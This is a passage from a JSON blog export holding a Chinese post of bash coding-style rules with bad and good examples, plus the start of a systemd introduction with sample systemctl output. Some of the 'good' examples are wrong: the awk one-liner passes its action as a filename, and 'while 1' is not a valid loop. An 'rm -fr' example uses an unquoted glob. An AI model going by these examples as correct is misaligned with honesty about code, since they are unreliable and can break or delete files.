Decompression\\n\\n\\n\u539f\u6587\u94fe\u63a5:\\n\\nhttp://nginx.com/blog/tuning-nginx/"},{"id":"/2014/05/23/bash-shell-coding-style","metadata":{"permalink":"/notes/blog/2014/05/23/bash-shell-coding-style","editUrl":"https://github.com/itxx00/notes/tree/main/blog/2014-05-23-bash-shell-coding-style.md","source":"@site/blog/2014-05-23-bash-shell-coding-style.md","title":"shell\u811a\u672ccoding style\u603b\u7ed3","description":"","date":"2014-05-23T00:00:00.000Z","tags":[{"inline":true,"label":"bash","permalink":"/notes/blog/tags/bash"},{"inline":true,"label":"coding_style","permalink":"/notes/blog/tags/coding-style"}],"readingTime":3.36,"hasTruncateMarker":false,"authors":[],"frontMatter":{"layout":"post","title":"shell\u811a\u672ccoding style\u603b\u7ed3","description":"","categories":["shell"],"tags":["bash","coding_style"]},"unlisted":false,"prevItem":{"title":"NGINX\u6027\u80fd\u8c03\u4f18\u7b80\u8981","permalink":"/notes/blog/2014/10/19/nginx-perf-tun"},"nextItem":{"title":"Systemd\u57fa\u672c\u4f7f\u7528\u4ecb\u7ecd","permalink":"/notes/blog/2014/04/08/systemd-basic-usage"}},"content":"> \u8fd9\u91cc\u603b\u7ed3\u4e86\u4e2a\u4eba\u6bd4\u8f83\u63a8\u5d07\u7684shell\u811a\u672ccoding style\uff0c\u7f16\u5199\u51fa\u65b9\u4fbf\u9605\u8bfb\u548c\u7ef4\u62a4\u7684\u811a\u672c\u662f\u8fd0\u7ef4\u4eba\u5458\u7684\u57fa\u672c\u64cd\u5b88\u3002\\n\\n\\n1.\u5173\u4e8e\u7f29\u8fdb\uff1a \u4e00\u4e2atab\u5b9a\u4e49\u4e3a4\u4e2a\u7a7a\u683c\uff1b\\n\u5173\u4e8e\u8fd9\u4e2a\u7f29\u8fdb\u8ddd\u79bb\u8c8c\u4f3c\u6709\u592a\u591a\u7684\u7684\u8bf4\u6cd5\u4e86\uff0c\u6709\u7684\u4f1a\u75288\u4e2a\u7a7a\u683c\uff0c\u6709\u7684\u75282\u4e2a\u7a7a\u683c\uff0c\u8fd8\u6709\u7684\u75284\u4e2a\u7a7a\u683c\uff1b\u4e0d\u8fc7\u6700\u7ec8\u53d6\u51b3\u4e8e\u56e2\u961f\u98ce\u683c\u3002\u4f46\u662f\u8bb0\u4f4f\uff0c\u6b63\u786e\u7684\u505a\u6cd5\u662f\u9879\u76ee\u3001\u6587\u4ef6\u3001\u6210\u5458\u95f4\u5168\u90e8\u7edf\u4e00\uff0c\u5343\u4e07\u4e0d\u8981\u51fa\u73b0\u4e00\u4e2a\u9879\u76ee\u5185\u5404\u79cd\u7f29\u8fdb\uff0ctab\u548c\u7a7a\u683c\u6df7\u7528\uff0c\u751a\u81f3\u4e00\u4e2a\u6587\u4ef6\u4e2d\u7684\u7f29\u8fdb\u90fd\u4e0d\u7edf\u4e00\u7684\u60c5\u51b5\u3002\u5728vim\u4e2d\u8bbe\u7f6e\u5982\u4e0b\uff1a\\n```\\nset ts=4\\nset sw=4\\nset expandtab\\n```\\n\\n2.\u5c3d\u91cf\u7f29\u77ed\u5355\u884c\u7684\u957f\u5ea6\uff0c\u6700\u597d\u4e0d\u8d85\u8fc772\u5b57\u7b26\uff08\u6ce8\u610f\uff1a\u8fd9\u4e2a\u9650\u5236\u56e0\u5386\u53f2\u539f\u56e0\u5bfc\u81f4\uff0c\u4e3a\u4e86\u517c\u5bb9\u90a3\u4e9b\u8001\u7684\u7ec8\u7aef\u8bbe\u5907\u800c\u8003\u8651\uff0c\u5b9e\u9645\u4e0a\u73b0\u5728\u5df2\u7ecf\u4e0d\u9002\u7528\u4e86\uff0c\u5355\u884c\u4ee3\u7801\u53ef\u4ee5\u66f4\u957f\uff0c\u53ea\u8981\u4e0d\u8981\u8d85\u8fc7\u5927\u591a\u6570\u5c4f\u5e55\u7684\u8f93\u51fa\u5bbd\u5ea6\u5c31\u597d\uff09\\n\\nbad:\\n\\n```\\nthisisaverylongline || thisisanotherlongline\\n```\\n\\ngood:\\n\\n```\\nthisisaverylongline ||\\n    thisisanotherlongline\\n```\\n\\n3.\u6ce8\u91ca\u5c3d\u91cf\u4fdd\u6301\u6e05\u6670\u7684\u5c42\u6b21,#\u53f7\u4e0e\u6ce8\u91ca\u6587\u672c\u95f4\u4fdd\u6301\u4e00\u4e2a\u7a7a\u683c\u4ee5\u793a\u548c\u4ee3\u7801\u7684\u533a\u5206\\n\\nbad:\\n\\n```\\n#this is a comment\\n#this is a code line\\n```\\n\\ngood:\\n\\n```\\n# this is a comment\\n#this is code line\\n```\\n\\n4.\u5b9a\u4e49\u51fd\u6570\u53ef\u4ee5\u4e0d\u7528\u5199function\u5173\u952e\u5b57\uff0c\u51fd\u6570\u540d\u5b57\u5c3d\u91cf\u77ed\u5c0f\u65e0\u6b67\u4e49\uff0c\u5c3d\u91cf\u4f20\u9012\u8fd4\u56de\u503c\\n\\nbad:\\n\\n```\\nfunction  cmd1\\n```\\n\\ngood:\\n\\n```\\ncmd_start() {\\n   dosomethinghere\\n   return 0\\n}\\n```\\n\\n5.\u5168\u5c40\u53d8\u91cf\u7528\u5927\u5199\uff0c\u5c40\u90e8\u53d8\u91cf\u7528\u5c0f\u5199\uff0c\u51fd\u6570\u5185\u5c3d\u91cf\u4e0d\u8981\u4f7f\u7528\u5168\u5c40\u53d8\u91cf\uff0c\u4ee5\u514d\u6df7\u6dc6\u5bfc\u81f4\u53d8\u91cf\u8986\u76d6,\u6ce8\u610f\u5c3d\u91cf\u4f7f\u7528\u5c0f\u5199\u8868\u793a\u53d8\u91cf\\n\\nbad:\\n```\\nfoo() {\\n    a=2\\n    echo $a\\n}\\na=1\\necho $a\\n```\\n\\ngood:\\n```\\nfoo(){\\n    local a\\n    a=2\\n    echo $a\\n}\\nA=1\\necho $A\\n```\\n\\n6.\u4f7f\u7528\u5185\u5efa\u7684[] \u3001[[]] \u8fdb\u884c\u6761\u4ef6\u6d4b\u8bd5\uff0c\u907f\u514d\u4f7f\u7528test\u547d\u4ee4\\n\\nbad:\\n```\\ntest -f filename\\n```\\n\\ngood:\\n```\\n[ -f filename ]\\n[[ -n $string ]]\\n```\\n\\n7.\u4f7f\u7528$(())\u8fdb\u884c\u666e\u901a\u8fd0\u7b97\uff0c\u5c3d\u91cf\u907f\u514d\u4f7f\u7528expr\u6216\u5176\u4ed6\u5916\u90e8\u547d\u4ee4 $[]\u4e5f\u53ef\u7528\u4e8e\u8ba1\u7b97\\n\\nbad:\\n```\\nnum=$(expr 1 + 1)\\n```\\n\\ngood:\\n```\\nnum=$((1+1))\\nnum=$[1+2]\\n```\\n\\n8.\u7ba1\u9053\u7b26\u5de6\u53f3\u90fd\u5e94\u52a0\u7a7a\u683c\uff0c\u91cd\u5b9a\u5411\u7b26\u7a7a\u683c\u52a0\u5de6\u4e0d\u52a0\u53f3\\n\\nbad:\\n```\\nfind /data -name tmp*|xargs rm -fr\\ncat a>b\\n```\\n\\ngood:\\n```\\nfind /data -name tmp* | xargs rm -fr\\ncat a >b\\n```\\n9.\u5f53`source`\u547d\u4ee4\u5c5e\u4e8e\u5916\u90e8\u547d\u4ee4\u7684\u65f6\u5019\uff0c\u6211\u4eec\u5e94\u5c3d\u91cf\u4f7f\u7528`.`   \uff0c\u5f53\u89c6\u529b\u4e0d\u597d\u6015\u5199\u9519\u770b\u9519\u7684\u65f6\u5019\uff0c\u5e94\u5c3d\u91cf\u4e0d\u7528`.`\u800c\u7528`source`\uff0c\u5728\u5b9e\u9645\u4f7f\u7528\u4e2d\u6211\u4eec\u53d1\u73b0`.`\u53f7\u6781\u96be\u8fa8\u8ba4\uff0c\u8fd9\u91cc\u63a8\u8350\u4f7f\u7528source\u547d\u4ee4\uff0c\u66f4\u65b9\u4fbf\u7ef4\u62a4\u3002\\n\\nbad:\\n```\\n. func_file\\n```\\n\\ngood:\\n```\\nsource func_file\\n```\\n\\n10.if \u548c then \u4e4b\u95f4\u4f7f\u7528\u5206\u53f7+\u7a7a\u683c\u5206\u9694\uff0c\u4e0d\u8981\u7528\u6362\u884c\uff0c\u4e66\u5199\u4e0a\u548cc style\u7c7b\u4f3c\uff1a\\n\\nbad:\\n```\\ngrep string logfile\\nif [ $? -ne 0 ]\\nthen\\n  dosomething\\nfi\\n\\nwhile 1\\ndo\\n  do something here\\ndone\\n```\\n\\ngood:\\n\\n```\\nif grep string logfile; then\\n    dosomething\\nfi\\n\\nwhile 1; do\\n   do something here\\ndone\\n```\\n\u6ce8\u610f;\u548cthen\u95f4\u6709\u4e00\u4e2a\u7a7a\u683c\u7684\u8ddd\u79bb\\n\\n11.\u5982\u679cgrep\u80fd\u76f4\u63a5\u5904\u7406\u6587\u4ef6\u8f93\u5165\u90a3\u5c31\u4e0d\u8981\u548ccat\u8fde\u7528; \u5982\u679cwc\u80fd\u76f4\u63a5\u4ece\u6587\u4ef6\u7edf\u8ba1\u5c31\u4e0d\u8981\u548ccat\u8fde\u7528; \u5982\u679cgrep\u80fd\u7edf\u8ba1\u884c\u6570\u5c31\u4e0d\u8981\u548cwc\u8fde\u7528\\n\\nbad:\\n```\\ncat file | grep tring\\ncat file.list | wc -l\\ngrep avi av.list | wc -l\\n```\\n\\ngood:\\n\\n```\\ngrep tring file\\nwc -l file.list\\ngrep -c avi av.list\\n```\\n\\n12.\u5982\u679cawk\u7684\u65f6\u5019\u9700\u8981\u641c\u7d22\u6070\u597dawk\u53c8\u80fd\u641c\u7d22\uff0c\u90a3\u4e48\u5c31\u4e0d\u8981\u518d\u548cgrep\u8fde\u7528\\n\\nbad:\\n```\\ndosomething | grep tring | awk \'{print $1}\'\\n```\\n\\ngood:\\n```\\ndosomething | awk \'/tring/\' \'{print $1}\'\\n```\\n\\n13\u3001\u5c3d\u91cf\u7f16\u5199\u517c\u5bb9\u65e7\u7248\u672cshell\u98ce\u683c\u4e14\u542b\u4e49\u6e05\u6670\u7684\u4ee3\u7801\uff0c\u4e0d\u63a8\u8350\u4e0d\u517c\u5bb9\u5199\u6cd5\u6216\u8005\u4e0d\u65b9\u4fbf\u4ed6\u4eba\u7ef4\u62a4\u7684\u4ee3\u7801\\n\\nbad:\\n```\\ndo_some_thing |& do_another_thing\\ndo_some_thing &>> some_where\\n```\\n\\ngood:\\n```\\ndo_some_thing 2>&1 | do_another_thing\\ndo_some_thing >some_where 2>&1\\n```\\n\\n***\u6ce8\u610f*** : \u4ee5\u4e0a\u4ec5\u4ee3\u8868\u4e2a\u4eba\u4e60\u60ef\u548c\u7406\u89e3\uff0c\u5e76\u4e0d\u80fd\u9002\u7528\u4e8e\u6240\u6709\u4eba\uff0c\u9002\u5408\u7684\u624d\u662f\u6700\u597d\u7684\u3002\\n\\n\u62d3\u5c55\u9605\u8bfb\u6587\u6863\uff1a\\n- http://kodango.me/simple-bash-programming-skills\\n- http://kodango.me/simple-bash-programming-skills-2\\n- http://www.commandlinefu.com/commands/browse\\n- http://wiki.bash-hackers.org/scripting/style"},{"id":"/2014/04/08/systemd-basic-usage","metadata":{"permalink":"/notes/blog/2014/04/08/systemd-basic-usage","editUrl":"https://github.com/itxx00/notes/tree/main/blog/2014-04-08-systemd-basic-usage.md","source":"@site/blog/2014-04-08-systemd-basic-usage.md","title":"Systemd\u57fa\u672c\u4f7f\u7528\u4ecb\u7ecd","description":"","date":"2014-04-08T00:00:00.000Z","tags":[{"inline":true,"label":"systemd","permalink":"/notes/blog/tags/systemd"}],"readingTime":11.19,"hasTruncateMarker":false,"authors":[],"frontMatter":{"layout":"post","title":"Systemd\u57fa\u672c\u4f7f\u7528\u4ecb\u7ecd","description":"","categories":["system"],"tags":["systemd"]},"unlisted":false,"prevItem":{"title":"shell\u811a\u672ccoding style\u603b\u7ed3","permalink":"/notes/blog/2014/05/23/bash-shell-coding-style"},"nextItem":{"title":"\u4f7f\u7528fpm2\u6765\u7ba1\u7406ssh\u5bc6\u7801","permalink":"/notes/blog/2013/11/12/use-fpm2-to-manage-password"}},"content":"> \u4f46\u662f\u7531\u4e8e\u8ba1\u7b97\u673a\u8f6f\u786c\u4ef6\u7684\u4e0d\u65ad\u53d1\u5c55\uff0c\u4eba\u4eec\u9010\u6e10\u53d1\u73b0sysvinit\u6240\u63d0\u4f9b\u7684\u529f\u80fd\u5df2\u7ecf\u65e0\u6cd5\u6ee1\u8db3\u5f53\u524d\u7684\u9700\u6c42\uff0c\u670d\u52a1\u591a\u5e74\u7684sysvinit\u7ec8\u5c06\u8fc7\u65f6\uff0c\u4e8e\u662f\u4e00\u4e9b\u66ff\u4ee3\u7684\u65b9\u6848\u5f00\u59cb\u51fa\u73b0\uff0c\u8fd9\u5176\u4e2d\u5305\u62ecupstart \uff0csystemd\u7b49\u3002\\n\\n\\n## \u5173\u4e8ePID 1\\n\u5728linux\u7684\u4e16\u754c\u91cc\uff0c\u7b2c\u4e00\u4e2a\u542f\u52a8\u5230\u7528\u6237\u7a7a\u95f4\u7684\u8fdb\u7a0b\u540d\u53ebinit\uff0c\u5176pid\u4e3a1\uff0cinit\u8fdb\u7a0b\u542f\u52a8\u5b8c\u6bd5\u540e\uff0c\u5b83\u76f8\u5f53\u4e8e\u5176\u4ed6\u8fdb\u7a0b\u7684\u6839\uff0c\u8d1f\u8d23\u5c06\u5176\u4ed6\u7684\u670d\u52a1\u8fdb\u7a0b\u542f\u52a8\u8d77\u6765\uff0c\u6700\u7ec8\u542f\u52a8\u6210\u4e3a\u4e00\u4e2a\u5b8c\u6574\u53ef\u7528\u7684\u7cfb\u7edf\u3002\u800c\u63d0\u4f9b\u8fd9\u4e2ainit\u7a0b\u5e8f\u7684\u8f6f\u4ef6\u540d\u4e3asysvinit\uff0c\u5b83\u5728\u6574\u4e2alinux\u7cfb\u7edf\u4e2d\u6240\u62c5\u4efb\u7684\u89d2\u8272\u91cd\u8981\u7a0b\u5ea6\u65e0\u53ef\u539a\u975e\u3002\u4f46\u662f\u7531\u4e8e\u8ba1\u7b97\u673a\u8f6f\u786c\u4ef6\u7684\u4e0d\u65ad\u53d1\u5c55\uff0c\u4eba\u4eec\u9010\u6e10\u53d1\u73b0sysvinit\u6240\u63d0\u4f9b\u7684\u529f\u80fd\u5df2\u7ecf\u65e0\u6cd5\u6ee1\u8db3\u5f53\u524d\u7684\u9700\u6c42\uff0c\u670d\u52a1\u591a\u5e74\u7684sysvinit\u7ec8\u5c06\u8fc7\u65f6\uff0c\u4e8e\u662f\u4e00\u4e9b\u66ff\u4ee3\u7684\u65b9\u6848\u5f00\u59cb\u51fa\u73b0\uff0c\u8fd9\u5176\u4e2d\u5305\u62ecupstart \uff0csystemd\u7b49\u3002\\n\\n## init\u7684\u8d23\u4efb\\n\u4e3a\u4ec0\u4e48\u8bf4sysvinit\u4f1a\u8fc7\u65f6\u5462\uff1f\u6211\u4eec\u4ece\u7528\u6237\u9700\u6c42\u7684\u89d2\u5ea6\u6765\u770b\u4e0d\u96be\u53d1\u73b0\uff0c\u5176\u5b9e\u6211\u4eec\u5bf9init\u7684\u6700\u539f\u59cb\u6700\u6838\u5fc3\u9700\u6c42\u662f\uff0c\u5c06\u7cfb\u7edf\u4ece\u5185\u6838\u5f15\u5bfc\u81f3\u7528\u6237\u7a7a\u95f4\uff0c\u800c\u7531\u4e8e\u73b0\u5728\u786c\u4ef6\u6c34\u5e73\u7684\u53d1\u5c55\uff0c\u4f7f\u5f97\u6211\u4eec\u5728\u5355\u7eaf\u7684\u539f\u59cb\u9700\u6c42\u4e4b\u4e0a\u4ea7\u751f\u4e86\u65b0\u7684\u6216\u8005\u66f4\u591a\u7684\u9700\u6c42\uff0c\u90a3\u5c31\u662f\u4e0d\u4ec5\u8981\u5f15\u5bfc\u7cfb\u7edf\uff0c\u800c\u4e14\u8981\u5feb\u901f\u7684\u5f15\u5bfc\u7cfb\u7edf\u3002\u800c\u65e9\u5728sysvinit\u8bde\u751f\u7684\u90a3\u4e2a\u65f6\u5019\u542f\u52a8\u901f\u5ea6\u7684\u91cd\u8981\u7a0b\u5ea6\u4f3c\u4e4e\u4e0d\u662f\u5f88\u9ad8\uff0c\u6240\u4ee5\u5b83\u5728\u8fd9\u65b9\u9762\u663e\u5f97\u6709\u4e9b\u8001\u662f\u5f88\u81ea\u7136\u7684\u3002\u73b0\u5728\u8ba9\u6211\u4eec\u7ee7\u7eed\u601d\u8003\u4e00\u4e0b\u5982\u4f55\u624d\u80fd\u5b9e\u73b0\u5feb\u901f\u5f15\u5bfc\u3002\u8bd5\u60f3\uff0c\u5f53\u4e00\u4e2a\u7cfb\u7edf\u542f\u52a8\u7684\u65f6\u5019\u9700\u8981\u542f\u52a8\u957f\u957f\u7684\u4e00\u5217\u670d\u52a1\uff0c\u8fd9\u6837\u7684\u7cfb\u7edf\u542f\u52a8\u901f\u5ea6\u5e94\u8be5\u4e0d\u4f1a\u5feb\u5230\u54ea\u91cc\u53bb\uff0c\u5982\u5927\u591a\u6570\u4eba\u4f7f\u7528\u684c\u9762\u7cfb\u7edf\u7684\u60c5\u51b5\u4e00\u6837\uff0c\u4e00\u4e2a\u52a0\u5feb\u7cfb\u7edf\u542f\u52a8\u901f\u5ea6\u7684\u6700\u76f4\u63a5\u65b9\u6cd5\u5c31\u662f\u51cf\u5c11\u542f\u52a8\u9879\uff0c\u628a\u4e0d\u5fc5\u8981\u7684\u542f\u52a8\u9879\u7981\u6b62\u6389\u3002\u800c\u53e6\u5916\u4e00\u4e2a\u65b9\u6cd5\u5219\u5b9e\u73b0\u8d77\u6765\u4e0d\u50cf\u7b2c\u4e00\u4e2a\u8fd9\u4e48\u7b80\u5355\uff0c\u90a3\u5c31\u662f\u5e76\u884c\u542f\u52a8\u3002\u5e76\u884c\u542f\u52a8\u53ef\u4ee5\u5e26\u6765\u7684\u901f\u5ea6\u63d0\u5347\u663e\u800c\u6613\u89c1\uff0c\u6211\u4eec\u53ea\u9700\u8981\u5c3d\u53ef\u80fd\u4fdd\u8bc1\u8ba9\u66f4\u591a\u7684\u670d\u52a1\u53ef\u4ee5\u5e76\u884c\u542f\u52a8\u5373\u53ef\u3002\u800c\u4ece\u5176\u4ed6\u65b9\u9762\u6765\u770bsysvinit\u7531\u4e8e\u5bf9\u811a\u672c\u7684\u4f9d\u8d56\u5bfc\u81f4\u542f\u52a8\u5b8c\u6bd5\u6240\u6709\u670d\u52a1\u8fc7\u7a0b\u4e2d\u9700\u8981\u5927\u91cf\u7684\u6267\u884c\u5916\u90e8\u547d\u4ee4\uff0c\u8fd9\u4e00\u70b9\u4e5f\u5c06\u5bfc\u81f4\u5f15\u5bfc\u901f\u5ea6\u7684\u53d8\u6162\u3002\\n\\n## \u540e\u8d77\u4e4b\u79c0\\n\u5f53\u4e00\u9879\u6807\u51c6\u5df2\u7ecf\u65e0\u6cd5\u6ee1\u8db3\u5f53\u4e0b\u53d1\u5c55\u7684\u9700\u6c42\u65f6\uff0c\u6700\u597d\u7684\u529e\u6cd5\u662f\u6253\u7834\u9648\u89c4\u8ba9\u81ea\u5df1\u53d8\u6210\u65b0\u7684\u6807\u51c6\u3002systemd\u5c31\u662f\u8fd9\u4e48\u505a\u7684\uff0c\u56e0\u4e3a\u73b0\u5b9e\u7684\u9700\u8981\u5b83\u5df2\u7ecf\u4e0d\u80fd\u987e\u53caPOSIX\u6807\u51c6\u4e86\uff0c\u4ee5\u4e0d\u81f3\u4e8e\u963b\u788d\u5176\u66f4\u597d\u7684\u53d1\u5c55\uff0c\u800csystemd\u5728\u8bbe\u8ba1\u4e4b\u521d\u4e5f\u548c\u82f9\u679c\u7684launchd\u5728\u67d0\u4e9b\u5730\u65b9\u4e0d\u8c0b\u800c\u5408\u3002\u5c3d\u7ba1\u5728\u6700\u521d\u7684\u65f6\u5019\u8fd9\u79cd\u505a\u6cd5\u6ca1\u6709\u5f97\u5230\u6240\u6709\u4eba\u7684\u8ba4\u53ef\u751a\u81f3\u662f\u60f9\u607c\u4e86\u4e00\u4e9b\u5bb6\u4f19\uff0c\u4f46\u662f\u73b0\u5728\u770b\u6765systemd\u5df2\u7ecf\u6210\u4e3a\u4e86\u4e8b\u5b9e\u4e0a\u7684\u6807\u51c6\u4e86\uff0c\u73b0\u5728\u5df2\u7ecf\u91c7\u7528systemd\u7684\u53d1\u884c\u7248\u6709fedora\uff0copensuse\uff0cdebian\uff0cubuntu\uff0crhel7\uff0carchlinux\u7b49\uff0c\u5c3d\u7ba1\u5728systemd\u7684\u63a8\u5e7f\u8fc7\u7a0b\u4e2d\u53d1\u751f\u4e86\u5f88\u591a\u66f2\u6298\uff0c\u4f46\u6700\u7ec8\u5927\u5bb6\u7684\u9009\u62e9\u662f\u4e00\u81f4\u7684---\u671d\u7740\u66f4\u597d\u7684\u65b9\u5411\u53d1\u5c55\u800c\u4e0d\u662f\u58a8\u5b88\u9648\u89c4\u3002\\n\u5728\u529f\u80fd\u4e0a\uff0csystemd\u4e0d\u4ec5\u4ec5\u662f\u89e3\u51b3\u4e86\u73b0\u6709\u7a0b\u5e8f\u7684\u79cd\u79cd\u95ee\u9898\uff0c\u800c\u4e14\u5305\u542b\u4e86\u5927\u91cf\u65b0\u7684\u7279\u6027\uff0c\u8fd9\u610f\u5473\u7740\u7cfb\u7edf\u4e2d\u539f\u672c\u9700\u8981\u7684\u5f88\u591a\u7ec4\u4ef6\u73b0\u5728\u4e5f\u90fd\u53ef\u4ee5\u4e0b\u5c97\u4e86\uff0c\u4e0b\u9762\u6765\u770b\u770bsystemd\u7684\u4e00\u4e9b\u7279\u6027\uff1a\\n\\n* \u670d\u52a1\u7ba1\u7406 - \u63d0\u4f9b\u4e86\u7edf\u4e00\u7684\u542f\u52a8/\u505c\u6b62/\u91cd\u542f/\u91cd\u8f7d \u800c\u4e0d\u518d\u9700\u8981\u7f16\u5199\u4e00\u5927\u5768\u811a\u672c\u6765\u5e72\u8fd9\u79cd\u539f\u672c\u5c31\u5e94\u8be5\u5341\u5206\u7b80\u5355\u57fa\u672c\u4e14\u91cd\u8981\u7684\u4e8b\u60c5\uff0c\u53d6\u800c\u4ee3\u4e4b\u7684\u662f\u66f4\u4e3a\u7b80\u6d01\u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u8fd9\u4e5f\u8868\u793a\u4eca\u540e\u7684\u7cfb\u7edf\u4e2d\u5404\u79cdservice\u542f\u52a8\u63a7\u5236\u7684\u7edf\u4e00\u6027\uff0c\u4f7f\u5f97daemon\u670d\u52a1\u5f00\u53d1\u8005\u514d\u4e8e\u7f16\u5199\u5404\u79cd\u770b\u4e0a\u53bb\u53c2\u5dee\u4e0d\u9f50\u7684\u542f\u52a8\u811a\u672c\uff0c\u589e\u52a0\u4e86\u901a\u7528\u6027\u3002\\n* socket\u7ba1\u7406 - \u652f\u6301\u76d1\u542csocket\uff0c\u8fd9\u4f7f\u5f97socket\u7684\u76d1\u542c\u548c\u670d\u52a1\u672c\u8eab\u53ef\u4ee5\u76f8\u4e92\u72ec\u7acb\uff0c\u4e00\u65b9\u9762\u53ef\u4ee5\u4ee5\u6b64\u63d0\u9ad8\u670d\u52a1\u542f\u52a8\u901f\u5ea6\uff0c\u53e6\u5916\u4e00\u65b9\u9762\u8fd8\u53ef\u4ee5\u8282\u7ea6\u7cfb\u7edf\u5f00\u9500\u3002\\n* \u8bbe\u5907\u7ba1\u7406 - \u53ef\u4ee5\u914d\u5408udev\u89c4\u5219\u5bf9\u8bbe\u5907\u8fdb\u884c\u7ba1\u7406\uff0c\u8fd8\u53ef\u4ee5\u914d\u5408/etc/fstab\u6587\u4ef6\u5b9e\u73b0\u78c1\u76d8\u7684\u6302\u8f7d\u7ba1\u7406\uff0c\u751a\u81f3\u5b9e\u73b0\u66f4\u9ad8\u7ea7\u7684\u81ea\u52a8\u6302\u8f7d\uff1b\\n* target\u5206\u7ec4 - \u628a\u4e0d\u540c\u7684unit\u7ec4\u5408\u8d77\u6765\uff0c\u7ec4\u5408\u5230\u540c\u4e00\u4e2atarget\u91cc\u9762\uff0c\u5b8c\u5168\u53d6\u4ee3sysvinit\u7684\u8fd0\u884c\u7b49\u7ea7\u7684\u6982\u5ff5\uff1b\\n* \u72b6\u6001\u5feb\u7167 - \u53ef\u4ee5\u5bf9\u5f53\u524d\u7cfb\u7edf\u4e2d\u7684unit\u72b6\u6001\u8fdb\u884c\u5feb\u7167\uff0c\u8fd9\u4e2a\u6982\u5ff5\u6709\u4e9b\u7c7b\u4f3c\u4e8e\u7cfb\u7edf\u7684\u4f11\u7720\u4e0e\u6062\u590d\uff0c\u4f60\u53ef\u4ee5\u8ba9\u7cfb\u7edf\u4ece\u4e00\u4e2a\u72b6\u6001\u5207\u6362\u8fdb\u5165\u53e6\u5916\u4e00\u4e2a\u72b6\u6001\uff1b\\n\\n## systemd\u7ba1\u7406\u5165\u95e8\\n\u4e0b\u9762\u6211\u4eec\u5c06\u901a\u8fc7\u4e00\u4e9b\u4f8b\u5b50\u6765\u6f14\u793a\u4e00\u4e9b\u57fa\u672c\u7684\u7ba1\u7406\u547d\u4ee4\uff0c\u8fd9\u4e9b\u547d\u4ee4\u5bf9\u4e8e\u7cfb\u7edf\u7ba1\u7406\u5458\u6765\u8bf4\u81f3\u5173\u91cd\u8981\u3002\\n\\n### 1  \u5982\u4f55\u68c0\u67e5\u542f\u52a8\u9879\\n\u4efb\u4f55\u542f\u52a8\u9879\uff0c\u53ea\u8981\u662f\u5728\u7cfb\u7edf\u542f\u52a8\u65f6\u6709\u88ab\u6267\u884c\u5230\uff0c\u4e0d\u8bba\u542f\u52a8\u6210\u529f\u8fd8\u662f\u5931\u8d25\uff0csystemd\u90fd\u80fd\u591f\u8bb0\u5f55\u4e0b\u4ed6\u4eec\u7684\u72b6\u6001\uff0c\u76f4\u63a5\u6267\u884c\u4e0d\u5e26\u53c2\u6570\u7684systemctl\u547d\u4ee4\u5373\u53ef\u89c2\u5bdf\u5230\uff0c\u5982\u4e0b\uff1a\\n~~~bash\\n# systemctl\\nUNIT                                             LOAD   ACTIVE SUB       DESCRIPTION\\nproc-sys-fs-binfmt_misc.automount                loaded active waiting   Arbitrary Executable File Formats File System Aut\\nsys-devices-pci...0-backlight-acpi_video1.device loaded active plugged   /sys/devices/pci0000:00/0000:00:01.0/0000:01:00.0\\nsys-devices-pci...0-backlight-acpi_video0.device loaded active plugged   /sys/devices/pci0000:00/0000:00:02.0/backlight/ac\\nsys-devices-pci...00-0000:00:19.0-net-em1.device loaded active plugged   82579LM Gigabit Network Connection\\nsys-devices-pci...d1.4:1.0-bluetooth-hci0.device loaded active plugged   /sys/devices/pci0000:00/0000:00:1a.0/usb1/1-1/1-1\\nsys-devices-pci...000:00:1b.0-sound-card0.device loaded active plugged   6 Series/C200 Series Chipset Family High Definiti\\nsys-devices-pci...0000:03:00.0-net-wlp3s0.device loaded active plugged   RTL8188CE 802.11b/g/n WiFi Adapter\\nsys-devices-pci...-0:0:0:0-block-sda-sda1.device loaded active plugged   ST9500420AS\\nsys-devices-pci...-0:0:0:0-block-sda-sda2.device loaded active plugged   ST9500420AS\\nsys-devices-pci...-0:0:0:0-block-sda-sda3.device loaded active plugged   ST9500420AS\\nsys-devices-pci...-0:0:0:0-block-sda-sda5.device loaded active plugged   ST9500420AS\\nsys-devices-pci...-0:0:0:0-block-sda-sda6.device loaded active plugged   ST9500420AS\\nsys-devices-pci...-0:0:0:0-block-sda-sda7.device loaded active plugged   LVM PV EKHM59-PY9G-AoRX-Nr9k-nnxN-XxxO-DFcj4N on\\nsys-devices-pci...0:0:0-0:0:0:0-block-sda.device loaded active plugged   ST9500420AS\\nsys-devices-pci...-1:0:0:0-block-sdb-sdb1.device loaded active plugged   KINGSTON_SVP200S360G\\nsys-devices-pci...-1:0:0:0-block-sdb-sdb2.device loaded active plugged   LVM PV rlRqSb-IlQn-DJQi-i7fg-sUV5-3bjI-g2npg7 on\\nsys-devices-pci...1:0:0-1:0:0:0-block-sdb.device loaded active plugged   KINGSTON_SVP200S360G\\n~~~\\n\\n\u8981\u68c0\u67e5\u5177\u4f53\u7684\u670d\u52a1\uff0c\u5219\u4f7f\u7528status\u9009\u9879\u52a0\u4e0a\u670d\u52a1\u540d\u5373\u53ef\uff0c\u5982\u4e0b\uff1a\\n~~~bash\\n# systemctl status libvirtd\\nlibvirtd.service - Virtualization daemon\\n   Loaded: loaded (/usr/lib/systemd/system/libvirtd.service; enabled)\\n   Active: active (running) since \u4e00 2014-04-07 19:10:30 CST; 9min ago\\n     Docs: man:libvirtd(8)\\n           http://libvirt.org\\n Main PID: 1673 (libvirtd)\\n   CGroup: /system.slice/libvirtd.service\\n           \u251c\u25001673 /usr/sbin/libvirtd\\n           \u2514\u25001804 /sbin/dnsmasq --conf-file=/var/lib/libvirt/dnsmasq/default.conf\\n\\n\\n4\u6708 07 19:10:33 localhost.localdomain dnsmasq[1804]: using nameserver 218.6.200.139#53\\n4\u6708 07 19:10:33 localhost.localdomain dnsmasq[1804]: using nameserver 61.139.2.69#53\\n4\u6708 07 19:10:33 localhost.localdomain dnsmasq[1804]: using local addresses only for unqualified names\\n4\u6708 07 19:10:33 localhost.localdomain dnsmasq[1804]: read /etc/hosts - 3 addresses\\n4\u6708 07 19:10:33 localhost.localdomain dnsmasq[1804]: read /var/lib/libvirt/dnsmasq/default.addnhosts - 0 addresses\\n4\u6708 07 19:10:33 localhost.localdomain dnsmasq-dhcp[1804]: read /var/lib/libvirt/dnsmasq/default.hostsfile\\nHint: Some lines were ellipsized, use -l to show in 